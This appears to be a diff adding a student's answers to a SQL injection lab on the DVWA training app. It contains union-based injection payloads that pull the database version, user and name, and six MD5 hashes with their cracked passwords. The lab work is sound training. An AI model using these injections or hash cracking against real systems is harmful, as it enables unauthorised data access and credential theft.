@@ -1,0 +1,31 @@
+What is the server’s OS? 
+ID: asdf' or 0=0 union select null, version() # 
+First name: 
+Surname: 5.1.41-3ubuntu12.6-log
+
+Who is the Database user that executed the command?
+ID: asdf' or 0=0 union select null, user() #
+First name: 
+Surname: dvwa@localhost
+
+What is the name of the database? 
+ID: asdf' or 0=0 union select null, database() #
+First name: 
+Surname: dvwa
+
+Take the password hashes from the result of Step 20 and decode the passwords using an online free password cracker.  Provide the clear text password result from each of the 6 hashes to answer the question.  
+
+21232f297a57a5a743894a0e4a801fc3
+md5	admin
+e99a18c428cb38d5f260853678922e03
+md5	abc123
+8d3533d75ae2c3966d7e0d4fcc69216b
+md5	charley
+0d107d09f5bbe40cade3de5c71e9e9b7
+md5	letmein
+5f4dcc3b5aa765d61d8327deb882cf99
+md5	password
+ee11cbb19052e40b07aac0ca060c23ee
+md5	user
+
+
